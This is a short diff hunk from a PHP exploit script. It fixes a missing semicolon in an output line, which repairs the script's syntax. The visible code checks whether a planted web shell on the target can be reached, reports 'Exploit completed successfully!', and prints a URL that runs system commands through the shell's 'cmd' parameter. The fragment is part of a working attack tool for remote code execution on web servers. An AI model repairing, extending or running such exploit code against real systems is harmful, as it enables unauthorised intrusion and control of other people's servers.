@@ -52,7 +52,7 @@ curl_close($handle);
 if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r'))
 {
     echo "\t[+] Exploit completed successfully!\n";
-    echo "\t______________________________________________\n\n"
+    echo "\t______________________________________________\n\n";
     echo "\t{$shell}?cmd=system('id');\n";
 }
 else
